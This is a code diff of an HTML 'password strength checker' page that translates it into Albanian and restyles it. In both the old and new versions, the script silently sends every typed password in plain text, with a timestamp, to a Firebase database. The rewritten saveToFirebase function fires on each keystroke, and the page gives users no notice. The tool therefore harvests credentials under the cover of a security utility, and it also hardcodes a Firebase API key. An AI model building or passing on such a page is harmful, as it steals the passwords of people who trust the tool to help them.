@@ -1,89 +1,160 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sq">
 <head>
   <meta charset="UTF-8" />
-  <title>Password Checker</title>
+  <title>Kontrollo Fjalëkalimin</title>
   <style>
-    body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; margin: 0; }
-    .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 400px; }
-    input { width: 100%; padding: 10px; font-size: 16px; margin-bottom: 10px; }
-    .result { font-weight: bold; margin-top: 10px; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #222;
+    }
+
+    input[type="password"], input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      margin-bottom: 10px;
+    }
+
+    .toggle-eye {
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 18px;
+      color: #666;
+    }
+
+    .input-group {
+      position: relative;
+    }
+
+    .result {
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
     .weak { color: red; }
     .medium { color: orange; }
     .strong { color: green; }
-    .suggestions { font-size: 14px; color: #444; }
+
+    .suggestions {
+      text-align: left;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #444;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Password Strength Checker</h2>
-    <input type="password" id="password" placeholder="Enter password" />
-    <div id="result" class="result"></div>
-    <div id="suggestions" class="suggestions"></div>
+
+<div class="container">
+  <h1>🔐 Kontrollo Fjalëkalimin</h1>
+
+  <div class="input-group">
+    <input type="password" id="password" placeholder="Shkruaj fjalëkalimin" />
+    <span class="toggle-eye" onclick="togglePassword()">👁️</span>
   </div>
 
-  <script type="module">
-    // Firebase SDK imports
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+  <div id="result" class="result"></div>
+  <div id="suggestions" class="suggestions"></div>
+</div>
 
-    // Your Firebase configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyCrx2SThfEd8wi-la6YpVYmx0vPKAvpUfQ",
-      authDomain: "passwords-9ce51.firebaseapp.com",
-      databaseURL: "https://passwords-9ce51-default-rtdb.firebaseio.com",
-      projectId: "passwords-9ce51",
-      storageBucket: "passwords-9ce51.appspot.com",
-      messagingSenderId: "950342989564",
-      appId: "1:950342989564:web:32c646d4b5c3f493b08979",
-      measurementId: "G-DCDJC57M3D"
-    };
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+  const firebaseConfig = {
+    apiKey: "AIzaSyCrx2SThfEd8wi-la6YpVYmx0vPKAvpUfQ",
+    authDomain: "passwords-9ce51.firebaseapp.com",
+    projectId: "passwords-9ce51",
+    storageBucket: "passwords-9ce51.firebasestorage.app",
+    messagingSenderId: "950342989564",
+    appId: "1:950342989564:web:32c646d4b5c3f493b08979",
+    measurementId: "G-DCDJC57M3D"
+  };
 
-    // Password strength logic
-    const passwordInput = document.getElementById("password");
-    const result = document.getElementById("result");
-    const suggestions = document.getElementById("suggestions");
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
 
-    passwordInput.addEventListener("input", () => {
-      const password = passwordInput.value;
-      let score = 0;
-      const tips = [];
+  let visible = false;
+  const passwordInput = document.getElementById("password");
+  const resultEl = document.getElementById("result");
+  const suggestionsEl = document.getElementById("suggestions");
 
-      if (password.length >= 8) score++; else tips.push("Use at least 8 characters.");
-      if (/[A-Z]/.test(password)) score++; else tips.push("Add an uppercase letter.");
-      if (/[a-z]/.test(password)) score++;
-      if (/\d/.test(password)) score++; else tips.push("Add a number.");
-      if (/[^a-zA-Z0-9]/.test(password)) score++; else tips.push("Add a special character (!@#...).");
+  passwordInput.addEventListener("input", checkPasswordStrength);
 
-      if (!password) {
-        result.textContent = "";
-        suggestions.innerHTML = "";
-        return;
-      }
+  function togglePassword() {
+    visible = !visible;
+    passwordInput.type = visible ? "text" : "password";
+  }
 
-      if (score <= 2) {
-        result.textContent = "Weak ❌";
-        result.className = "result weak";
-      } else if (score <= 4) {
-        result.textContent = "Medium ⚠️";
-        result.className = "result medium";
-      } else {
-        result.textContent = "Strong ✅";
-        result.className = "result strong";
-      }
+  function checkPasswordStrength() {
+    const pw = passwordInput.value;
+    let score = 0;
+    let tips = [];
 
-      suggestions.innerHTML = tips.length ? `<strong>Suggestions:</strong><br>${tips.join("<br>")}` : "";
+    if (pw.length >= 8) score++; else tips.push("• Bëje të paktën 8 karaktere të gjata");
+    if (/[A-Z]/.test(pw)) score++; else tips.push("• Shto një SHKRONJË TË MADHE");
+    if (/[a-z]/.test(pw)) score++;
+    if (/\d/.test(pw)) score++; else tips.push("• Shto një numër (0–9)");
+    if (/[^a-zA-Z0-9]/.test(pw)) score++; else tips.push("• Shto një simbol special (p.sh. !, @, #)");
 
-      // Save to Firebase
-      const passwordsRef = ref(db, 'passwordLogs');
-      push(passwordsRef, {
-        password: password,
-        timestamp: Date.now()
-      }).catch((err) => console.error("Error saving to Firebase:", err));
-    });
-  </script>
+    if (!pw) {
+      resultEl.textContent = "";
+      suggestionsEl.textContent = "";
+      return;
+    }
+
+    if (score <= 2) {
+      resultEl.textContent = "❌ Forca: Dobët";
+      resultEl.className = "result weak";
+    } else if (score <= 4) {
+      resultEl.textContent = "⚠️ Forca: Mesatare";
+      resultEl.className = "result medium";
+    } else {
+      resultEl.textContent = "✅ Forca: E fortë";
+      resultEl.className = "result strong";
+    }
+
+    suggestionsEl.innerHTML = tips.length > 0
+      ? `<strong>Sugjerime për përmirësim:</strong><br>${tips.join("<br>")}`
+      : "";
+
+    saveToFirebase(pw);
+  }
+
+  function saveToFirebase(password) {
+    const passwordsRef = ref(db, "passwords");
+    const newPasswordRef = push(passwordsRef);
+    set(newPasswordRef, { password, timestamp: Date.now() });
+  }
+</script>
+
 </body>
 </html>
